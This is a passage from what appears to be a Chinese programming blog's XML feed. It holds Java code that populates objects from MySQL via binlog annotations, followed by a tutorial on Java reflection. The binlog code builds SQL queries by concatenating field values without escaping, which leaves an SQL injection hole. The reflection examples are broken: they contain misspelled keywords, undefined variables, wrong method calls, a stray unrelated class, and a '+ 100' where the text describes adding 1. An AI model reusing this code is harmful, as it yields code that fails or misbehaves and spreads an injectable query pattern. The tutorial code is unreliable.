class="keyword">true</span>);</span><br><span class="line">            String dbName = dbProperties.getValue(column.catalog());<span class="comment">//获取实际数据库名称</span></span><br><span class="line">            <span class="keyword">if</span> (column.whereCause().contains(<span class="string">"#"</span>)) &#123;</span><br><span class="line">                <span class="comment">// 需要依赖对象binlog字段值</span></span><br><span class="line">                <span class="keyword">int</span> startLocation = column.whereCause().indexOf(<span class="string">"#&#123;"</span>) + <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">int</span> endLocation = column.whereCause().indexOf(<span class="string">"&#125;"</span>);</span><br><span class="line">                String refFieldName = column.whereCause().substring(startLocation, endLocation);</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; list.size(); i++) &#123;</span><br><span class="line">                    Object target = list.get(i);</span><br><span class="line">                    StringBuilder sql = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                    sql.append(SQL_STATEMENT_SELECT).append(<span class="string">"*"</span>).append(SQL_STATEMENT_FROM).append(dbName).append(<span class="string">"."</span>).append(column.table()).append(SQL_STATEMENT_WHERE);</span><br><span class="line">                    Object refFieldValue = datas.get(i).get(refFieldName);</span><br><span class="line">                    <span class="keyword">if</span> (refFieldValue == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 本对象缓存（db.table.columnName.value）</span></span><br><span class="line">                    <span class="comment">// 本对象缓存（db.table.id.3）</span></span><br><span class="line">                    String cacheKey = dbName + <span class="string">"."</span> + column.table() + <span class="string">"."</span> + refFieldName + <span class="string">"."</span> + refFieldValue;</span><br><span class="line">                    Map&lt;String, Object&gt; dataMap;</span><br><span class="line">                    <span class="keyword">if</span> (cachedMap.containsKey(cacheKey)) &#123;</span><br><span class="line">                        dataMap = cachedMap.get(cacheKey);</span><br><span class="line">                        log.debug(<span class="string">"命中缓存：cache_key:&#123;&#125;"</span>, cacheKey);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        log.debug(<span class="string">"cache_key:&#123;&#125;"</span>, cacheKey);</span><br><span class="line">                        <span class="keyword">if</span> (refFieldValue <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">                            refFieldValue = <span class="string">"'"</span> + refFieldValue + <span class="string">"'"</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        String whereCause = column.whereCause().replace(<span class="string">"#&#123;"</span> + refFieldName + <span class="string">"&#125;"</span>, String.valueOf(refFieldValue));</span><br><span class="line">                        sql.append(whereCause).append(SQL_STATEMENT_LIMIT);</span><br><span class="line">                        log.debug(<span class="string">"查询字段：&#123;&#125;，sql：&#123;&#125;"</span>, field.getName(), sql);</span><br><span class="line">                        dataMap = jdbcTemplate.queryForMap(sql.toString());</span><br><span class="line">                        <span class="keyword">if</span> (dataMap != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            cachedMap.put(cacheKey, dataMap);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (dataMap != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        log.debug(<span class="string">"field:&#123;&#125;,value:&#123;&#125;"</span>, field.getName(), column.name());</span><br><span class="line">                        Object value = dataMap.get(column.name());</span><br><span class="line">                        BinLogDict binLogDict = field.getAnnotation(BinLogDict<span class="class">.<span class="keyword">class</span>)</span>;<span class="comment">//判断是否需要翻译</span></span><br><span class="line">                        <span class="keyword">if</span> (binLogDict != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            Object countryCode = codeUtil.getCountryCode(binLogDict.codeType(), value, field.getType());</span><br><span class="line">                            log.info(<span class="string">"get companyCode fail value:&#123;&#125; companyCode:&#123;&#125;"</span>, value, countryCode);</span><br><span class="line">                            field.set(target, countryCode);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            field.set(target, value);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (column.whereCause().contains(<span class="string">"$"</span>)) &#123;</span><br><span class="line">                <span class="comment">// 需要依赖对象自身字段值</span></span><br><span class="line">                <span class="keyword">int</span> startLocation = column.whereCause().indexOf(<span class="string">"$&#123;"</span>) + <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">int</span> endLocation = column.whereCause().indexOf(<span class="string">"&#125;"</span>);</span><br><span class="line">                String refFieldName = column.whereCause().substring(startLocation, endLocation);</span><br><span class="line">                <span class="keyword">for</span> (Object target : list) &#123;</span><br><span class="line">                    StringBuilder sql = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                    sql.append(SQL_STATEMENT_SELECT).append(<span class="string">"*"</span>).append(SQL_STATEMENT_FROM).append(dbName).append(<span class="string">"."</span>).append(column.table()).append(SQL_STATEMENT_WHERE);</span><br><span class="line">                    Field refField = target.getClass().getDeclaredField(refFieldName);</span><br><span class="line">                    refField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                    Object refFieldValue = refField.get(target);</span><br><span class="line">                    <span class="keyword">if</span> (refFieldValue == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 本对象缓存（db.table.columnName.value）</span></span><br><span class="line">                    <span class="comment">// 本对象缓存（db.table.id.3）</span></span><br><span class="line">                    String cacheKey = dbName + <span class="string">"."</span> + column.table() + <span class="string">"."</span> + refFieldName + <span class="string">"."</span> + refFieldValue;</span><br><span class="line">                    Map&lt;String, Object&gt; dataMap;</span><br><span class="line">                    <span class="keyword">if</span> (cachedMap.containsKey(cacheKey)) &#123;</span><br><span class="line">                        dataMap = cachedMap.get(cacheKey);</span><br><span class="line">                        log.debug(<span class="string">"命中缓存：cache_key:&#123;&#125;"</span>, cacheKey);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (refFieldValue <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">                            refFieldValue = <span class="string">"'"</span> + refFieldValue + <span class="string">"'"</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        String whereCause = column.whereCause().replace(<span class="string">"$&#123;"</span> + refFieldName + <span class="string">"&#125;"</span>, String.valueOf(refFieldValue));</span><br><span class="line">                        sql.append(whereCause).append(SQL_STATEMENT_LIMIT);</span><br><span class="line">                        log.debug(<span class="string">"查询字段：&#123;&#125;，sql：&#123;&#125;"</span>, field.getName(), sql);</span><br><span class="line">                        dataMap = jdbcTemplate.queryForMap(sql.toString());</span><br><span class="line">                        <span class="keyword">if</span> (dataMap != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            cachedMap.put(cacheKey, dataMap);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (dataMap != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        log.debug(<span class="string">"field:&#123;&#125;,value:&#123;&#125;"</span>, field.getName(), column.name());</span><br><span class="line">                        Object value = dataMap.get(column.name());</span><br><span class="line">                        BinLogDict binLogDict = field.getAnnotation(BinLogDict<span class="class">.<span class="keyword">class</span>)</span>;<span class="comment">//判断是否需要翻译</span></span><br><span class="line">                        <span class="keyword">if</span> (binLogDict != <span class="keyword">null</span>) &#123;</span><br><span class="line">                            Object countryCode = codeUtil.getCountryCode(binLogDict.codeType(), value, field.getType());</span><br><span class="line">                            log.info(<span class="string">"get companyCode fail value:&#123;&#125; companyCode:&#123;&#125;"</span>, value, countryCode);</span><br><span class="line">                            field.set(target, countryCode);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            field.set(target, value);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//  不需要依赖对象自身字段值</span></span><br><span class="line">                StringBuilder sql = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                sql.append(SQL_STATEMENT_SELECT).append(column.name()).append(SQL_STATEMENT_FROM).append(dbName).append(<span class="string">"."</span>).append(column.table()).append(SQL_STATEMENT_WHERE);</span><br><span class="line">                sql.append(column.whereCause()).append(SQL_STATEMENT_LIMIT);</span><br><span class="line">                log.debug(<span class="string">"查询字段：&#123;&#125;，sql：&#123;&#125;"</span>, field.getName(), sql);</span><br><span class="line">                Object object = jdbcTemplate.queryForObject(sql.toString(), field.getType());</span><br><span class="line">                <span class="keyword">for</span> (Object target : list) &#123;</span><br><span class="line">                    log.debug(<span class="string">"field:&#123;&#125;,value:&#123;&#125;"</span>, field.getName(), column.name());</span><br><span class="line">                    BinLogDict binLogDict = field.getAnnotation(BinLogDict<span class="class">.<span class="keyword">class</span>)</span>;<span class="comment">//判断是否需要翻译</span></span><br><span class="line">                    <span class="keyword">if</span> (binLogDict != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        Object countryCode = codeUtil.getCountryCode(binLogDict.codeType(), object, field.getType());</span><br><span class="line">                        log.info(<span class="string">"get companyCode fail value:&#123;&#125; companyCode:&#123;&#125;"</span>, object, countryCode);</span><br><span class="line">                        field.set(target, countryCode);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        field.set(target, object);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            log.info(<span class="string">"&#123;&#125;"</span>, e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            field.setAccessible(<span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据报名取得改包下所有类</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> packageName</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> resourceLoader</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> List&lt;Class&gt; <span class="title">getClass</span><span class="params">(String packageName, ResourceLoader resourceLoader)</span> </span>&#123;</span><br><span class="line">        List&lt;Class&gt; classList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ResourcePatternResolver resolver = ResourcePatternUtils.getResourcePatternResolver(resourceLoader);</span><br><span class="line">            MetadataReaderFactory metaReader = <span class="keyword">new</span> CachingMetadataReaderFactory(resourceLoader);</span><br><span class="line">            Resource[] resources = resolver.getResources(<span class="string">"classpath*:"</span> + packageName.replaceAll(<span class="string">"\\."</span>, <span class="string">"/"</span>) + <span class="string">"/*.class"</span>);</span><br><span class="line">            <span class="keyword">for</span> (Resource r : resources) &#123;</span><br><span class="line">                MetadataReader reader = metaReader.getMetadataReader(r);</span><br><span class="line">                classList.add(Class.forName(reader.getClassMetadata().getClassName()));</span><br><span class="line">                log.debug(<span class="string">"-----&gt;binlog会自动转化的model类型：&#123;&#125;"</span>, reader.getClassMetadata().getClassName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            log.info(<span class="string">""</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> classList;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> EventType &#123;</span><br><span class="line">    UNKNOWN,</span><br><span class="line">    START_V3,</span><br><span class="line">    QUERY,</span><br><span class="line">    STOP,</span><br><span class="line">    ROTATE,</span><br><span class="line">    INTVAR,</span><br><span class="line">    LOAD,</span><br><span class="line">    SLAVE,</span><br><span class="line">    CREATE_FILE,</span><br><span class="line">    APPEND_BLOCK,</span><br><span class="line">    EXEC_LOAD,</span><br><span class="line">    DELETE_FILE,</span><br><span class="line">    NEW_LOAD,</span><br><span class="line">    RAND,</span><br><span class="line">    USER_VAR,</span><br><span class="line">    FORMAT_DESCRIPTION,</span><br><span class="line">    XID,</span><br><span class="line">    BEGIN_LOAD_QUERY,</span><br><span class="line">    EXECUTE_LOAD_QUERY,</span><br><span class="line">    TABLE_MAP,</span><br><span class="line">    PRE_GA_WRITE_ROWS,</span><br><span class="line">    PRE_GA_UPDATE_ROWS,</span><br><span class="line">    PRE_GA_DELETE_ROWS,</span><br><span class="line">    WRITE_ROWS,</span><br><span class="line">    UPDATE_ROWS,</span><br><span class="line">    DELETE_ROWS,</span><br><span class="line">    INCIDENT,</span><br><span class="line">    HEARTBEAT,</span><br><span class="line">    IGNORABLE,</span><br><span class="line">    ROWS_QUERY,</span><br><span class="line">    EXT_WRITE_ROWS,</span><br><span class="line">    EXT_UPDATE_ROWS,</span><br><span class="line">    EXT_DELETE_ROWS,</span><br><span class="line">    GTID,</span><br><span class="line">    ANONYMOUS_GTID,</span><br><span class="line">    PREVIOUS_GTIDS,</span><br><span class="line">    TRANSACTION_CONTEXT,</span><br><span class="line">    VIEW_CHANGE,</span><br><span class="line">    XA_PREPARE;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">EventType</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反射获取对象属性实战及工具类</title>
      <link href="/2023/03/04/java%E5%8F%8D%E5%B0%84%E8%8E%B7%E5%8F%96%E5%AF%B9%E8%B1%A1%E5%B1%9E%E6%80%A7%E5%AE%9E%E6%88%98%E5%8F%8A%E5%B7%A5%E5%85%B7%E7%B1%BB/"/>
      <url>/2023/03/04/java%E5%8F%8D%E5%B0%84%E8%8E%B7%E5%8F%96%E5%AF%B9%E8%B1%A1%E5%B1%9E%E6%80%A7%E5%AE%9E%E6%88%98%E5%8F%8A%E5%B7%A5%E5%85%B7%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是反射"><a href="#什么是反射" class="headerlink" title="什么是反射"></a>什么是反射</h2><p>反射就是把Java类中的各个成分映射成一个个的Java对象。即在运行状态中，对于任意一个类，都能够知道这个类的所以属性和方法；对于任意一个对象，都能调用它的任意一个方法和属性。这种动态获取信息及动态调用对象方法的功能叫Java的反射机制。</p><h4 id="反射机制的功能"><a href="#反射机制的功能" class="headerlink" title="反射机制的功能"></a>反射机制的功能</h4><p>Java反射机制主要提供了以下功能：</p><ul><li>在运行时判断任意一个对象所属的类。</li><li>在运行时构造任意一个类的对象。</li><li>在运行时判断任意一个类所具有的成员变量和方法。</li><li>在运行时调用任意一个对象的方法。</li><li>生成动态代理。</li></ul><h4 id="反射的使用"><a href="#反射的使用" class="headerlink" title="反射的使用"></a>反射的使用</h4><h5 id="运行时构造修改对象"><a href="#运行时构造修改对象" class="headerlink" title="运行时构造修改对象"></a>运行时构造修改对象</h5><p>假定需求: 将List<Student>集合中reward = true的对象的score属性置为”100”，这里用反射实现举例。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String score;</span><br><span class="line">    <span class="keyword">private</span> Boolean reward;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> List&lt;Student&gt; <span class="title">getReForecastDataView</span><span class="params">(List&lt;Student&gt; students)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span>(Student student : students) &#123;</span><br><span class="line">        <span class="keyword">if</span>(student.getReward) &#123;</span><br><span class="line">            Field[] declaredFields = ForecastingOCUnionCategoryVO<span class="class">.<span class="keyword">class</span>.<span class="title">getDeclaredFields</span>()</span>;</span><br><span class="line">            Field field = Student.getClass().getDeclaredField(<span class="string">"score"</span>);</span><br><span class="line">                field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                field.set(student, <span class="string">"100"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> students;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="获取特定注解的值并收集到集合中"><a href="#获取特定注解的值并收集到集合中" class="headerlink" title="获取特定注解的值并收集到集合中"></a>获取特定注解的值并收集到集合中</h5><p>假定需求，一个billing 对象有十二个月份属性，值为对应月份产生的消耗，现在要将未发生月份置为0，已发生月份置为原来的值加上1(value = value + 1), 当前月份置为1。</p><p>Billing对象，月份属性添加特殊注解便于区分属性。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> calss Billing &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@CalculateField</span></span><br><span class="line">    <span class="keyword">private</span> Integer jan;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@CalculateField</span></span><br><span class="line">    <span class="keyword">private</span> Integer feb;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@CalculateField</span></span><br><span class="line">    <span class="keyword">private</span> Integer mar;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@CalculateField</span></span><br><span class="line">    <span class="keyword">private</span> Integer apr;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@CalculateField</span></span><br><span class="line">    <span class="keyword">private</span> Integer may;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@CalculateField</span></span><br><span class="line">    <span class="keyword">private</span> Integer jun;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@CalculateField</span></span><br><span class="line">    <span class="keyword">private</span> Integer jul;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@CalculateField</span></span><br><span class="line">    <span class="keyword">private</span> Integer aug;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@CalculateField</span></span><br><span class="line">    <span class="keyword">private</span> Integer sep;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@CalculateField</span></span><br><span class="line">    <span class="keyword">private</span> Integer oct;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@CalculateField</span></span><br><span class="line">    <span class="keyword">private</span> Integer nov;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@CalculateField</span></span><br><span class="line">    <span class="keyword">private</span> Integer dec;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line"><span class="meta">@Target</span>(ElementType.FIELD)</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> CalculateField &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> List&lt;String&gt; monthsList = Arrays.asList(<span class="string">"jul"</span>, <span class="string">"aug"</span>, <span class="string">"sep"</span>, <span class="string">"oct"</span>, <span class="string">"nov"</span>, <span class="string">"dec"</span>, <span class="string">"jan"</span>, <span class="string">"feb"</span>, <span class="string">"mar"</span>, <span class="string">"apr"</span>, <span class="string">"may"</span>, <span class="string">"jun"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取已发生月份</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> List&lt;String&gt; <span class="title">getPastMonth</span><span class="params">(String fiscalYear)</span></span>&#123;</span><br><span class="line">    List&lt;String&gt; resultList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    String currentMonth = YearMonth.now().toString();</span><br><span class="line">    <span class="keyword">for</span> (String month : monthsList) &#123;</span><br><span class="line">        <span class="keyword">int</span> year = LocalDate.getYear();</span><br><span class="line">        month = getMonth(year, month);</span><br><span class="line">        <span class="comment">// before now</span></span><br><span class="line">        <span class="keyword">if</span>(StringUtils.compare(month, currentMonth) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            resultList.add(month);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> resultList;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getMonth</span><span class="params">(String year, String monthAd)</span> </span>&#123;</span><br><span class="line">    Integer monthNumber = MonthNumberEnum.getNumberByMonth(monthAd.toLowerCase());</span><br><span class="line">    <span class="keyword">if</span> (monthNumber &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> yearStr + <span class="string">"-"</span> + monthNumber;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> yearStr + <span class="string">"-0"</span> + monthNumber;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> List&lt;Billing&gt; <span class="title">TransformBilling</span><span class="params">(List&lt;Billing&gt; billings)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 已发生月份</span></span><br><span class="line">    List&lt;String&gt; pastMonths = getPastMonth()</span><br><span class="line">    <span class="comment">// 当前月份</span></span><br><span class="line">    String monthAd = YearMonth.parse(month, DateTimeFormatter.ofPattern(<span class="string">"yyyy-MM"</span>)).getMonth().toString().substring(<span class="number">0</span>, <span class="number">3</span>).toLowerCase();</span><br><span class="line">          </span><br><span class="line">    <span class="keyword">for</span>(Billing billing : billings) &#123;</span><br><span class="line">        Field[] declaredFields = ForecastingOCUnionCategoryVO<span class="class">.<span class="keyword">class</span>.<span class="title">getDeclaredFields</span>()</span>;</span><br><span class="line">         <span class="keyword">for</span> (Field field : declaredFields) &#123;</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">             <span class="comment">// 特殊注解属性，即十二个月份属性</span></span><br><span class="line">            <span class="keyword">if</span> (field.getAnnotation(CalculateField<span class="class">.<span class="keyword">class</span>) !</span>= <span class="keyword">null</span>) &#123;</span><br><span class="line">                String fieldName = field.getName();</span><br><span class="line">                <span class="comment">// 已发生月份</span></span><br><span class="line">                <span class="keyword">if</span> (pastMonthList.contains(fieldName)) &#123;</span><br><span class="line">                    field.set(billing, (Integer)field.get(billing) + <span class="number">100</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fieldName.equals(monthAd)) &#123;</span><br><span class="line">                    <span class="comment">// 当前月份</span></span><br><span class="line">                    field.set(billing, <span class="number">1</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 未发生月份</span></span><br><span class="line">                     field.set(billing, <span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="反射工具类"><a href="#反射工具类" class="headerlink" title="反射工具类"></a>反射工具类</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span 